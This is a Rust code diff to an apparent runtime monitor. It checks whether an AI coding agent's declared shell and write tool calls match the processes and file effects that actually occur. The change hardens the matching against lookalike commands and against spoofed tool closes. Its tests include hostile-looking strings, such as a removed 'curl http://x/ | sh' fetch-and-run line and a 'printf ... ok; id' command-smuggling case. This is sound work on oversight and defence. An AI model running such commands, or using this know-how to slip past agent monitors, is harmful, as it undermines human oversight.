@@ -9,25 +9,26 @@
 //! effects to the span:
 //!
 //! - A `proc.exec` while spans are open joins one when its ancestry
-//!   (through `ppid`) reaches the agent, which is the session's root
-//!   process until a later milestone names the executor: by argv first (a
-//!   shell tool whose declared command the exec's shell command carries),
-//!   else as the only open span. One that joins no span waits
-//!   [`PENDING_NS`] for a late `tool.open`.
+//!   (through `ppid`) reaches the agent (the session's root, or the span's
+//!   bound executor): by argv first (a shell tool whose declared command
+//!   the exec carries, compared exactly as the call sent it), else as the
+//!   only open span. One that joins no span waits [`PENDING_NS`] for a
+//!   late `tool.open`.
 //! - A process forked or exec'd by a span's process joins that span.
-//! - A filesystem effect joins the span of its process. One by a process
-//!   in no span (the agent's own work, as for a `Write` tool) joins the
+//! - A filesystem effect joins the span of its process. One by the agent
+//!   itself, in no span (as for a `Write` tool), joins the
 //!   only open write tool span, or the write tool span whose declared
 //!   path it touches; a shell tool's work is its process's, and the
 //!   agent's own housekeeping meanwhile is nobody's. One that joins
 //!   nothing waits for its process to join.
 //! - A `net.connect` joins the span of the process its `proc.tcp_connect`
 //!   named, once the two have met.
-//! - The executor of a span is the process whose `proc.tls_io` write,
-//!   within [`EXECUTOR_WINDOW_NS`] of the gate's `http.request` and sized
-//!   like its body (within a tenth plus 1 KiB, as one write or as the
-//!   window's sum for the process), carried the model request the span
-//!   came from; the session root otherwise.
+//! - The executor of a span is the process that opened the flow its
+//!   model request came over (bound); until that is known, provisionally,
+//!   the one process whose `proc.tls_io` writes, within
+//!   [`EXECUTOR_WINDOW_NS`] of the gate's `http.request` and sized like its
+//!   body, carried it. Only a bound executor counts as the agent, and only
+//!   it may close the span ([`CLOSE_WAIT_NS`]).
 //!
 //! At close the span's membership is written as `span.effects`, and the
 //! rules judge it: `intent_effect_mismatch` (`argv` at the join,
@@ -40,7 +41,7 @@ use std::collections::{HashMap, VecDeque};
 use std::sync::{Arc, Mutex, PoisonError};
 
 use boxcar_proto::control::{SpanEntry, MAX_SPAN_LIST};
-use boxcar_proto::redact::{scrub_argv, scrub_text};
+use boxcar_proto::redact::scrub_text;
 use boxcar_proto::{Finding, FindingCategory, ProcExec, Record, SpanEffects, ToolClose, ToolOpen};
 use serde_json::Value;
 
@@ -98,6 +99,11 @@ pub const MAX_DECLARED_BYTES: usize = 8 * 1024 * 1024;
 pub const DECLARED_ARGS_LIMIT: usize = 64 * 1024;
 /// The most flows whose opener is remembered.
 const MAX_FLOW_OWNERS: usize = 4096;
+/// The most `tool.close`s waiting to learn who opened their flow.
+const MAX_PENDING_CLOSES: usize = 256;
+/// How long a `tool.close` waits to learn who opened its flow; one that
+/// never learns is not applied, and its span stays open.
+pub const CLOSE_WAIT_NS: u64 = 2_000_000_000;
 
 /// A tool call's arguments as the model sent them, before any scrub.
 #[derive(Clone, Debug, PartialEq, Eq)]
@@ -105,6 +111,32 @@ pub enum Declared {
     Json(Value),
     /// Free text (Codex's custom tools), or JSON that did not parse.
     Text(String),
+}
+
+/// A shell tool's declared command, as the model sent it.
+#[derive(Clone, Debug, PartialEq, Eq)]
+enum Command {
+    /// A command line, for a shell to run.
+    Text(String),
+    /// An argv, run as it is.
+    Argv(Vec<String>),
+}
+
+impl Command {
+    /// The command on one line, as a finding quotes it.
+    fn display(&self) -> String {
+        match self {
+            Command::Text(text) => one_line(text),
+            Command::Argv(argv) => one_line(&argv.join(" ")),
+        }
+    }
+
+    fn mentions(&self, needle: &str) -> bool {
+        match self {
+            Command::Text(text) => text.contains(needle),
+            Command::Argv(argv) => argv.iter().any(|arg| arg.contains(needle)),
+        }
+    }
 }
 
 /// The arguments of tool calls as the model sent them: the gate puts
@@ -243,16 +275,22 @@ pub enum EffectKind {
 pub struct Span {
     pub id: String,
     pub tool_name: String,
-    /// The declared shell command, normalized, for a shell tool.
-    declared: Option<String>,
+    /// The declared shell command, for a shell tool.
+    declared: Option<Command>,
     /// The declared command and paths are the call's arguments as sent
     /// (from [`DeclaredArgs`]), not the record's scrubbed copy.
     declared_raw: bool,
+    /// The declared command as a finding quotes it: from the record's
+    /// scrubbed copy, scrubbed again as text.
+    declared_display: Option<String>,
     /// The flow and stream of the model request the span came from.
     request: (u64, u32),
     /// The declared paths, as (mount, path without its leading slash),
     /// for a write tool.
     paths: Vec<(String, String)>,
+    /// The declared paths as a finding quotes them, from the record's
+    /// scrubbed copy.
+    paths_display: Vec<String>,
     /// The arguments as text, lowercase: what a connection's names are
     /// looked for in.
     args_text: String,
@@ -292,6 +330,21 @@ impl Span {
     /// gate kept them, else by the record's scrubbed copy.
     fn new(open: &ToolOpen, raw: Option<Declared>, seq: u64, ts: u64) -> Span {
         let name = open.tool_name.as_str();
+        // What the record has, scrubbed: what findings quote.
+        let (recorded_command, recorded_paths) = match open.args.as_ref() {
+            Some(args) => (declared_command(name, args), declared_paths(name, args)),
+            None => (
+                declared_command_text(name, &open.args_summary),
+                declared_paths_text(name, &open.args_summary),
+            ),
+        };
+        let declared_display = recorded_command
+            .as_ref()
+            .map(|command| scrub_text(&command.display()));
+        let paths_display = recorded_paths
+            .iter()
+            .map(|(mount, path)| format!("{} on {mount}", scrub_text(path)))
+            .collect();
         let (declared, paths, mut args_text, declared_raw) = match &raw {
             Some(Declared::Json(args)) => (
                 declared_command(name, args),
@@ -305,20 +358,15 @@ impl Span {
                 text.clone(),
                 true,
             ),
-            None => match open.args.as_ref() {
-                Some(args) => (
-                    declared_command(name, args),
-                    declared_paths(name, args),
-                    args.to_string(),
-                    false,
-                ),
-                None => (
-                    declared_command_text(name, &open.args_summary),
-                    declared_paths_text(name, &open.args_summary),
-                    open.args_summary.clone(),
-                    false,
-                ),
-            },
+            None => (
+                recorded_command,
+                recorded_paths,
+                match open.args.as_ref() {
+                    Some(args) => args.to_string(),
+                    None => open.args_summary.clone(),
+                },
+                false,
+            ),
         };
         args_text.make_ascii_lowercase();
         Span {
@@ -326,8 +374,10 @@ impl Span {
             tool_name: open.tool_name.clone(),
             declared,
             declared_raw,
+            declared_display,
             request: (open.flow, open.stream),
             paths,
+            paths_display,
             args_text,
             opened: (seq, ts),
             closed: None,
@@ -361,33 +411,23 @@ impl Span {
 
     /// An exec joined the span: notes whether it ran the declared command.
     fn note_exec(&mut self, argv: &[String]) {
-        if self.carried_by(&ExecForms::of(argv)) == Some(true) {
+        if self.carried_by(argv) == Some(true) {
             self.carried = true;
         }
     }
 
-    /// Whether an exec carries the declared command: compared as it ran
-    /// when the span has the call's arguments as sent; else scrubbed as
-    /// the record's copy is. `None` when that cannot tell: no declared
-    /// command, or a copy with a redacted part (two different values read
-    /// the same once redacted, so a match proves nothing).
-    fn carried_by(&self, forms: &ExecForms) -> Option<bool> {
-        let declared = self.declared.as_deref()?;
-        if self.declared_raw {
-            Some(carries(
-                forms.raw.text.as_deref(),
-                &forms.raw.whole,
-                declared,
-            ))
-        } else if declared.contains(REDACTED) {
-            None
-        } else {
-            Some(carries(
-                forms.clean.text.as_deref(),
-                &forms.clean.whole,
-                declared,
-            ))
+    /// Whether an exec carries the declared command, compared exactly
+    /// ([`carries`]): with the call's arguments as sent, or with the
+    /// record's copy when that has nothing redacted (a scrub only ever
+    /// puts in the redaction mark, so such a copy is the original). `None`
+    /// when that cannot tell: no declared command, or a copy with a
+    /// redacted part (two different values read the same once redacted).
+    fn carried_by(&self, argv: &[String]) -> Option<bool> {
+        let declared = self.declared.as_ref()?;
+        if !self.declared_raw && declared.mentions(REDACTED) {
+            return None;
         }
+        Some(carries(declared, argv))
     }
 
     fn has_member(&self, key: ProcKey) -> bool {
@@ -525,6 +565,17 @@ pub struct Spans {
     flow_order: VecDeque<u64>,
     /// The calls' arguments as sent, from the gate.
     declared: Option<DeclaredArgs>,
+    /// `tool.close`s of bound spans whose flow's opener is not known yet.
+    pending_closes: VecDeque<PendingClose>,
+    /// Findings a deferred close made, for the next tick to hand over.
+    deferred_findings: Vec<Finding>,
+}
+
+/// A `tool.close` waiting to learn who opened the flow it came over.
+#[derive(Clone, Debug)]
+struct PendingClose {
+    record: Record,
+    close: ToolClose,
 }
 
 impl Spans {
@@ -546,6 +597,8 @@ impl Spans {
             flow_owners: HashMap::new(),
             flow_order: VecDeque::new(),
             declared,
+            pending_closes: VecDeque::new(),
+            deferred_findings: Vec::new(),
         }
     }
 
@@ -792,22 +845,47 @@ impl Spans {
 
     /// A `tool.close`: closes the span, judges its connections and writes
     /// its `span.effects`.
+    /// A `tool.close`. For a span whose executor opened the request's
+    /// flow, only the same process may close it: a close over a flow
+    /// another process opened is not the agent's and is dropped (the span
+    /// stays open for its own close), and one over a flow whose opener is
+    /// not known yet waits [`CLOSE_WAIT_NS`] to learn it, else is dropped.
+    /// A span without a bound executor takes any close: there is nothing
+    /// to hold it to.
     pub fn close(&mut self, state: &State, record: &Record, close: &ToolClose) -> Vec<Finding> {
-        let id = close.tool_use_id.as_str();
-        // A close that came over a flow another process opened than the
-        // one the span's model request came from is not the agent's: the
-        // span stays open for its own.
-        let closer = self.flow_owners.get(&close.flow).copied();
-        let Some(span) = self.spans.get_mut(id) else {
+        let Some(span) = self.spans.get(&close.tool_use_id) else {
             return Vec::new();
         };
         if span.closed.is_some() || span.abandoned {
             return Vec::new();
         }
-        if let (true, Some(executor), Some(closer)) = (span.executor_bound, span.executor, closer) {
-            if closer.tgid != executor.tgid {
-                return Vec::new();
+        if let (true, Some(executor)) = (span.executor_bound, span.executor) {
+            match self.flow_owners.get(&close.flow) {
+                Some(closer) if *closer != executor => return Vec::new(),
+                Some(_) => {}
+                None => {
+                    if self.pending_closes.len() >= MAX_PENDING_CLOSES {
+                        self.pending_closes.pop_front();
+                    }
+                    self.pending_closes.push_back(PendingClose {
+                        record: record.clone(),
+                        close: close.clone(),
+                    });
+                    return Vec::new();
+                }
             }
+        }
+        self.apply_close(state, record, close)
+    }
+
+    /// Closes the span `close` names.
+    fn apply_close(&mut self, state: &State, record: &Record, close: &ToolClose) -> Vec<Finding> {
+        let id = close.tool_use_id.as_str();
+        let Some(span) = self.spans.get_mut(id) else {
+            return Vec::new();
+        };
+        if span.closed.is_some() || span.abandoned {
+            return Vec::new();
         }
         span.closed = Some((record.seq, record.ts_host_ns));
         span.status = Some(close.status.clone());
@@ -928,6 +1006,23 @@ impl Spans {
         for (stream, at) in streams {
             self.name_executor(state, flow, stream, key.tgid, at.max(ts), true);
         }
+        // Closes that waited to learn who opened this flow: the span's
+        // executor's are applied, any other process's dropped.
+        let (resolved, waiting): (Vec<PendingClose>, Vec<PendingClose>) = self
+            .pending_closes
+            .drain(..)
+            .partition(|pending| pending.close.flow == flow);
+        self.pending_closes = waiting.into();
+        for pending in resolved {
+            let executor = self
+                .spans
+                .get(&pending.close.tool_use_id)
+                .and_then(|span| span.executor);
+            if executor == Some(key) {
+                let findings = self.apply_close(state, &pending.record, &pending.close);
+                self.deferred_findings.extend(findings);
+            }
+        }
         let kind = EffectKind::Net { flow };
         match self.by_proc.get(&key).cloned() {
             Some(id) => {
@@ -949,7 +1044,14 @@ impl Spans {
 
     /// The timers: the checks a second after a close, and the waits.
     pub fn tick(&mut self, state: &State, now: u64) -> Vec<Finding> {
-        let mut findings = Vec::new();
+        let mut findings = std::mem::take(&mut self.deferred_findings);
+        while self
+            .pending_closes
+            .front()
+            .is_some_and(|p| now.saturating_sub(p.record.ts_host_ns) >= CLOSE_WAIT_NS)
+        {
+            self.pending_closes.pop_front();
+        }
         let due: Vec<String> = self
             .order
             .iter()
@@ -1005,11 +1107,10 @@ impl Spans {
         if self.open.is_empty() {
             return None;
         }
-        let forms = ExecForms::of(argv);
         let by_argv = self.open.iter().find(|id| {
             self.spans
                 .get(*id)
-                .is_some_and(|span| span.carried_by(&forms) == Some(true))
+                .is_some_and(|span| span.carried_by(argv) == Some(true))
         });
         if let Some(id) = by_argv {
             if self.reaches_agent(state, key, id) {
@@ -1322,12 +1423,11 @@ impl Spans {
         if span.declared.is_none() || !span.is_shell_tool() || span.mismatch.is_some() {
             return Vec::new();
         }
-        let forms = ExecForms::of(argv);
         // The finding quotes the command scrubbed, as a record would.
         let Some(command) = shell_command(argv) else {
             return Vec::new();
         };
-        match span.carried_by(&forms) {
+        match span.carried_by(argv) {
             Some(true) => span.carried = true,
             Some(false) => span.mismatch = Some((key, exec_seq, ts, command)),
             None => {}
@@ -1348,7 +1448,7 @@ impl Spans {
             return Vec::new();
         }
         let (Some((key, exec_seq, ts, command)), Some(declared)) =
-            (span.mismatch.clone(), span.declared.clone())
+            (span.mismatch.clone(), span.declared_display.clone())
         else {
             return Vec::new();
         };
@@ -1357,7 +1457,7 @@ impl Spans {
         let summary = format!(
             "the {tool} tool call {id} declared \"{}\", but the shell it ran (pid {}) was given \
              \"{}\", and nothing in the call ran the declared command",
-            quote(&scrub_text(&declared)),
+            quote(&declared),
             key.tgid,
             quote(&command)
         );
@@ -1468,11 +1568,7 @@ impl Spans {
         let Some((closed_seq, _)) = span.closed else {
             return Vec::new();
         };
-        let paths: Vec<String> = span
-            .paths
-            .iter()
-            .map(|(mount, path)| format!("{} on {mount}", scrub_text(path)))
-            .collect();
+        let paths = span.paths_display.clone();
         let summary = format!(
             "the {} tool call {id} ended ok, but no file was created, written or renamed at {} \
              in the second after it closed",
@@ -1553,10 +1649,9 @@ impl Spans {
 
 // --- the declared command and paths
 
-/// The command a shell tool declared, normalized: `command` or `cmd` (a
-/// string, or an array joined with spaces), or a `local_shell` action's
-/// `command`.
-fn declared_command(tool_name: &str, args: &Value) -> Option<String> {
+/// The command a shell tool declared, as sent: `command` or `cmd` (a
+/// string, or an array of strings), or a `local_shell` action's `command`.
+fn declared_command(tool_name: &str, args: &Value) -> Option<Command> {
     if !SHELL_TOOLS.contains(&tool_name) {
         return None;
     }
@@ -1564,24 +1659,24 @@ fn declared_command(tool_name: &str, args: &Value) -> Option<String> {
         .get("command")
         .or_else(|| args.get("cmd"))
         .or_else(|| args.get("action").and_then(|action| action.get("command")))?;
-    let text = match value {
-        Value::String(text) => text.clone(),
-        Value::Array(parts) => parts
-            .iter()
-            .filter_map(Value::as_str)
-            .collect::<Vec<_>>()
-            .join(" "),
-        _ => return None,
-    };
-    let text = normalize(&text);
-    (!text.is_empty()).then_some(text)
+    match value {
+        Value::String(text) => (!text.trim().is_empty()).then(|| Command::Text(text.clone())),
+        Value::Array(parts) => {
+            let argv = parts
+                .iter()
+                .map(|part| part.as_str().map(str::to_owned))
+                .collect::<Option<Vec<_>>>()?;
+            (!argv.is_empty()).then_some(Command::Argv(argv))
+        }
+        _ => None,
+    }
 }
 
 /// The command a shell tool declared when its arguments were free text
 /// (Codex's `exec` tool takes `tools.exec_command({cmd:"...", ...})`),
 /// read from the arguments' summary: the quoted string after `cmd:` or
-/// `command:` (with or without quotes around the name), normalized.
-fn declared_command_text(tool_name: &str, text: &str) -> Option<String> {
+/// `command:` (with or without quotes around the name), unescaped.
+fn declared_command_text(tool_name: &str, text: &str) -> Option<Command> {
     if !SHELL_TOOLS.contains(&tool_name) {
         return None;
     }
@@ -1604,8 +1699,7 @@ fn declared_command_text(tool_name: &str, text: &str) -> Option<String> {
             _ => command.push(ch),
         }
     }
-    let command = normalize(&command);
-    (!command.is_empty()).then_some(command)
+    (!command.trim().is_empty()).then_some(Command::Text(command))
 }
 
 /// The paths a write tool declared, as (mount, path without its leading
@@ -1689,64 +1783,47 @@ fn shell_argument(argv: &[String]) -> Option<&String> {
     argv.get(at + 2)
 }
 
-/// The shell's `-c` command scrubbed as a record's arguments are, and
-/// normalized: what a finding quotes.
+/// The shell's `-c` command scrubbed as a record's arguments are, on one
+/// line: what a finding quotes.
 fn shell_command(argv: &[String]) -> Option<String> {
-    let command = normalize(&scrub_text(shell_argument(argv)?));
+    let command = one_line(&scrub_text(shell_argument(argv)?));
     (!command.is_empty()).then_some(command)
 }
 
-/// An exec's whole argv, scrubbed as a tool's arguments are and
-/// normalized, to compare with a declared command.
-fn whole_argv(argv: &[String]) -> String {
-    normalize(&scrub_argv(argv).join(" "))
-}
-
-/// An exec's shell command and whole argv, normalized: as it ran, and
-/// scrubbed as a record's arguments are.
-struct ExecForms {
-    raw: Forms,
-    clean: Forms,
-}
-
-struct Forms {
-    /// The shell's `-c` command as given (or scrubbed), not normalized.
-    text: Option<String>,
-    whole: String,
-}
-
-impl ExecForms {
-    fn of(argv: &[String]) -> ExecForms {
-        let text = shell_argument(argv);
-        ExecForms {
-            raw: Forms {
-                text: text.cloned(),
-                whole: normalize(&argv.join(" ")),
-            },
-            clean: Forms {
-                text: text.map(|text| scrub_text(text)),
-                whole: whole_argv(argv),
-            },
+/// Whether an exec carries the declared command, compared exactly, the
+/// shell's quoting kept: a declared argv is the exec's argv; a declared
+/// command line is the shell's `-c` command (spaces at either end aside),
+/// or Claude Code's wrapper around exactly it ([`wraps`]), or, run without
+/// a shell, the exec's argv is its words. The declared command merely
+/// appearing in the shell's text (in a comment, beside other commands,
+/// inside a longer `eval`) is not carrying it, nor is a command that reads
+/// the same once its quotes are dropped.
+fn carries(declared: &Command, argv: &[String]) -> bool {
+    match declared {
+        Command::Argv(words) => argv == words.as_slice(),
+        Command::Text(text) => {
+            let text = text.trim();
+            if let Some(given) = shell_argument(argv) {
+                if given.trim() == text || wraps(given, text) {
+                    return true;
+                }
+            }
+            lex(text).is_some_and(|tokens| {
+                tokens.len() == argv.len()
+                    && tokens
+                        .iter()
+                        .zip(argv)
+                        .all(|(token, arg)| matches!(token, Tok::Word(word) if word == arg))
+            })
         }
     }
 }
 
-/// Whether an exec carries the declared command: its shell command is the
-/// declared one, or wraps exactly it as Claude Code's Bash tool does
-/// (its own setup, then `eval '<command>' < /dev/null && pwd -P >|
-/// <file>`), or its whole argv is the declared one. The declared command
-/// merely appearing in the shell's text (in a comment, beside other
-/// commands, inside a longer `eval`) is not carrying it.
-fn carries(text: Option<&str>, whole: &str, declared: &str) -> bool {
-    text.is_some_and(|text| normalize(text) == declared || wraps(text, declared))
-        || whole == declared
-}
-
 /// Whether the shell command `text` ends as Claude Code's wrapper around
-/// exactly `declared` (normalized), read as a shell reads it (quotes,
-/// escapes, comments): its last `&&` part `pwd -P >| <file>`, the one
-/// before it `eval <one word>` (and `< /dev/null` unless the command reads
-/// its own input) whose word is the declared command. The parts before
+/// exactly `declared`, read as a shell reads it (quotes, escapes,
+/// comments): its last `&&` part `pwd -P >| <file>`, the one before it
+/// `eval <one word>` (and `< /dev/null` unless the command reads its own
+/// input) whose word, unquoted, is the declared command. The parts before
 /// are the runtime's own setup (sourcing its shell snapshot, exports) and
 /// are not judged here, but each must be there: a comment or an open
 /// quote that swallows the rest is no wrapper.
@@ -1774,7 +1851,7 @@ fn wraps(text: &str, declared: &str) -> bool {
         }
         _ => return false,
     };
-    last_ok && normalize(word) == declared && setup.iter().all(|part| !part.is_empty())
+    last_ok && word.trim() == declared && setup.iter().all(|part| !part.is_empty())
 }
 
 /// A shell token at the top level of a command.
@@ -1890,26 +1967,9 @@ fn sized(bytes: u64, body: u64) -> bool {
     bytes.abs_diff(body) <= body / 10 + EXECUTOR_SLACK_BYTES
 }
 
-/// Whitespace runs as one space, no quotes or backslashes, trimmed: the
-/// form two commands are compared in.
-fn normalize(text: &str) -> String {
-    let mut out = String::with_capacity(text.len());
-    let mut space = false;
-    for ch in text.chars() {
-        if ch.is_whitespace() {
-            space = true;
-            continue;
-        }
-        if matches!(ch, '\'' | '"' | '\\') {
-            continue;
-        }
-        if space && !out.is_empty() {
-            out.push(' ');
-        }
-        space = false;
-        out.push(ch);
-    }
-    out
+/// Whitespace runs as one space, trimmed: a command on one line.
+fn one_line(text: &str) -> String {
+    text.split_whitespace().collect::<Vec<_>>().join(" ")
 }
 
 /// At most [`QUOTE_LIMIT`] bytes of a command, for a summary.
@@ -1932,27 +1992,34 @@ mod tests {
 
     #[test]
     fn a_declared_command_is_read_from_the_shapes_the_tools_use() {
+        let text = |t: &str| Some(Command::Text(t.to_owned()));
+        let argv = |a: &[&str]| Some(Command::Argv(a.iter().map(|s| (*s).to_owned()).collect()));
         assert_eq!(
             declared_command("Bash", &json!({"command": "  ls   -la\n"})),
-            Some("ls -la".to_owned())
+            text("  ls   -la\n")
         );
         assert_eq!(
             declared_command("shell", &json!({"command": ["bash", "-lc", "make test"]})),
-            Some("bash -lc make test".to_owned())
+            argv(&["bash", "-lc", "make test"])
         );
         assert_eq!(
             declared_command("exec_command", &json!({"cmd": "cargo build"})),
-            Some("cargo build".to_owned())
+            text("cargo build")
         );
         assert_eq!(
             declared_command(
                 "local_shell",
                 &json!({"action": {"type": "exec", "command": ["ls"]}})
             ),
-            Some("ls".to_owned())
+            argv(&["ls"])
         );
         assert_eq!(declared_command("Read", &json!({"command": "ls"})), None);
         assert_eq!(declared_command("Bash", &json!({"timeout": 5})), None);
+        assert_eq!(declared_command("Bash", &json!({"command": "  "})), None);
+        assert_eq!(
+            declared_command("shell", &json!({"command": ["ls", 5]})),
+            None
+        );
     }
 
     #[test]
@@ -1960,11 +2027,11 @@ mod tests {
         let text = "text(await tools.exec_command({cmd:\"echo  hi > \\\"a b\\\"\",workdir:\"/workspace\",max_output_tokens:1000}));";
         assert_eq!(
             declared_command_text("exec", text),
-            Some("echo hi > a b".to_owned())
+            Some(Command::Text("echo  hi > \"a b\"".to_owned()))
         );
         assert_eq!(
             declared_command_text("shell", "{\"command\": \"ls -la\"}"),
-            Some("ls -la".to_owned())
+            Some(Command::Text("ls -la".to_owned()))
         );
         assert_eq!(declared_command_text("Read", "cmd:\"ls\""), None);
         assert_eq!(declared_command_text("exec", "no command here"), None);
@@ -2021,43 +2088,51 @@ mod tests {
         assert_eq!(shell_command(&argv(&[])), None);
     }
 
+    fn words(parts: &[&str]) -> Vec<String> {
+        parts.iter().map(|p| (*p).to_owned()).collect()
+    }
+
+    fn text(t: &str) -> Command {
+        Command::Text(t.to_owned())
+    }
+
     #[test]
     fn a_wrapped_command_still_carries_the_declared_one() {
-        let declared = normalize("echo boxcar-m4 > marker.txt");
-        let wrapped = "eval 'echo boxcar-m4 > marker.txt' < /dev/null && pwd -P >| /tmp/claude-cwd";
-        assert!(carries(Some(wrapped), "", &declared));
+        let declared = text("echo boxcar-m4 > marker.txt");
+        let shell = |c: &str| words(&["bash", "-c", c]);
         assert!(carries(
-            None,
-            &normalize("bash -lc make test"),
-            "bash -lc make test"
+            &declared,
+            &shell("eval 'echo boxcar-m4 > marker.txt' < /dev/null && pwd -P >| /tmp/claude-cwd")
         ));
-        assert!(!carries(
-            Some("curl http://x/ | sh"),
-            "sh -c curl",
-            "ls -la"
-        ));
+        assert!(carries(&declared, &shell("echo boxcar-m4 > marker.txt")));
+        assert!(carries(&text("  ls -la\n"), &shell("ls -la")));
         // Claude Code's own setup before the eval is its own.
         assert!(carries(
-            Some(
+            &declared,
+            &shell(
                 "source /tmp/snapshot.sh 2>/dev/null || true && export PATH=\"${PATH:+$PATH:}\"'/x' && eval 'echo boxcar-m4 > marker.txt' < /dev/null && pwd -P >| /tmp/claude-1-cwd"
-            ),
-            "",
-            &declared
+            )
         ));
         // Its quoting of a quote, `'"'"'`, reads back as the quote.
-        let quoted = normalize("echo 'it''s'");
         assert!(carries(
-            Some(r#"eval 'echo '"'"'it'"'"''"'"'s'"'"'' < /dev/null && pwd -P >| /tmp/c"#),
-            "",
-            &quoted
+            &text("echo 'it''s'"),
+            &shell(r#"eval 'echo '"'"'it'"'"''"'"'s'"'"'' < /dev/null && pwd -P >| /tmp/c"#)
         ));
         // A command that reads its own input gets no `< /dev/null`.
-        let reads = normalize("sort < in.txt");
         assert!(carries(
-            Some("eval 'sort < in.txt' && pwd -P >| /tmp/c"),
-            "",
-            &reads
+            &text("sort < in.txt"),
+            &shell("eval 'sort < in.txt' && pwd -P >| /tmp/c")
         ));
+        // An argv, as declared; a line run without a shell, as its words.
+        let make = Command::Argv(words(&["bash", "-lc", "make test"]));
+        assert!(carries(&make, &words(&["bash", "-lc", "make test"])));
+        assert!(!carries(&make, &words(&["bash", "-lc", "make  test"])));
+        assert!(carries(
+            &text("ls -la 'a b'"),
+            &words(&["ls", "-la", "a b"])
+        ));
+        assert!(!carries(&text("ls -la a b"), &words(&["ls", "-la", "a b"])));
+        assert!(!carries(&text("ls -la"), &words(&["curl", "http://x/"])));
         // Only the wrapper around exactly the command, as the shell reads
         // it: nothing more, nothing in a comment or an open quote.
         for other in [
@@ -2073,8 +2148,16 @@ mod tests {
             "printf 'other && eval ' && eval 'echo boxcar-m4 > marker.txt' < /dev/null && pwd -P >| /tmp/c'",
             " && eval 'echo boxcar-m4 > marker.txt' < /dev/null && pwd -P >| /tmp/c",
         ] {
-            assert!(!carries(Some(other), "", &declared), "{other}");
+            assert!(!carries(&declared, &shell(other)), "{other}");
         }
+        // Quotes are kept: the same text without them is another program.
+        let quoted = text("printf '%s' 'ok; id'");
+        assert!(carries(&quoted, &shell("printf '%s' 'ok; id'")));
+        assert!(!carries(&quoted, &shell("printf '%s' ok; id")));
+        assert!(!carries(
+            &quoted,
+            &shell("eval 'printf '\"'\"'%s'\"'\"' ok; id' < /dev/null && pwd -P >| /tmp/c")
+        ));
     }
 
     #[test]
@@ -2104,32 +2187,62 @@ mod tests {
     }
 
     #[test]
-    fn a_declared_command_scrubbed_of_a_key_still_carries() {
-        let argv = |parts: &[&str]| parts.iter().map(|p| (*p).to_owned()).collect::<Vec<_>>();
+    fn a_record_copy_with_a_redaction_cannot_tell() {
+        let open = |args: Value| ToolOpen {
+            flow: 1,
+            stream: 1,
+            tool_use_id: "toolu_1".into(),
+            tool_name: "Bash".into(),
+            args_b3: None,
+            args_summary: args.to_string(),
+            args: Some(args),
+        };
         let command = "curl -H 'X-Api-Key: k1' https://example.com/";
-        let mut args = json!({"command": command});
-        boxcar_proto::redact::scrub_deep(&mut args);
-        let declared = declared_command("Bash", &args).unwrap();
-        assert!(!declared.contains("k1"));
-        let exec = argv(&["bash", "-c", command]);
-        assert!(carries(
-            shell_argument(&exec)
-                .map(|text| scrub_text(text))
-                .as_deref(),
-            &whole_argv(&exec),
-            &declared
-        ));
-        let flagged = argv(&["client", "--password", "demo-pass"]);
-        let mut parts = json!({"command": ["client", "--password", "demo-pass"]});
-        boxcar_proto::redact::scrub_deep(&mut parts);
-        let declared = declared_command("shell", &parts).unwrap();
-        assert!(!declared.contains("demo-pass"));
-        assert!(carries(None, &whole_argv(&flagged), &declared));
-        let direct = argv(&["curl", "-H", "X-Api-Key: k1", "https://example.com/"]);
-        let mut parts = json!({"command": ["curl", "-H", "X-Api-Key: k1", "https://example.com/"]});
-        boxcar_proto::redact::scrub_deep(&mut parts);
-        let declared = declared_command("shell", &parts).unwrap();
-        assert!(carries(None, &whole_argv(&direct), &declared));
+        let mut scrubbed = json!({"command": command});
+        boxcar_proto::redact::scrub_deep(&mut scrubbed);
+        let ran = words(&["bash", "-c", command]);
+        // The record's copy alone: redacted, so it cannot tell.
+        let span = Span::new(&open(scrubbed.clone()), None, 1, 1);
+        assert_eq!(span.carried_by(&ran), None);
+        // With the call's arguments as sent: exact.
+        let raw = Some(Declared::Json(json!({"command": command})));
+        let span = Span::new(&open(scrubbed), raw, 1, 1);
+        assert_eq!(span.carried_by(&ran), Some(true));
+        assert!(!span.declared_display.unwrap().contains("k1"));
+        // A copy with nothing redacted is the original.
+        let span = Span::new(&open(json!({"command": "ls -la"})), None, 1, 1);
+        assert_eq!(
+            span.carried_by(&words(&["bash", "-c", "ls -la"])),
+            Some(true)
+        );
+    }
+
+    #[test]
+    fn a_quoted_secret_is_quoted_scrubbed_whole() {
+        let open = |args: Value| ToolOpen {
+            flow: 1,
+            stream: 1,
+            tool_use_id: "toolu_1".into(),
+            tool_name: "Bash".into(),
+            args_b3: None,
+            args_summary: args.to_string(),
+            args: Some(args),
+        };
+        for command in [
+            json!("client --password 'alpha beta'"),
+            json!("client --password alpha\\ beta"),
+            json!(["client", "--password", "alpha beta"]),
+        ] {
+            let mut scrubbed = json!({"command": command});
+            boxcar_proto::redact::scrub_deep(&mut scrubbed);
+            let raw = Some(Declared::Json(json!({"command": command})));
+            let span = Span::new(&open(scrubbed), raw, 1, 1);
+            let display = span.declared_display.unwrap();
+            assert!(
+                !display.contains("alpha") && !display.contains("beta"),
+                "{display}"
+            );
+        }
     }
 
     #[test]
@@ -2144,9 +2257,9 @@ mod tests {
     }
 
     #[test]
-    fn normalize_collapses_space_and_drops_quotes() {
-        assert_eq!(normalize("  a \t b\n\"c\"  'd' \\e "), "a b c d e");
-        assert_eq!(normalize(""), "");
+    fn one_line_collapses_space_and_keeps_quotes() {
+        assert_eq!(one_line("  a \t b\n\"c\"  'd' \\e "), "a b \"c\" 'd' \\e");
+        assert_eq!(one_line(""), "");
     }
 
     #[test]
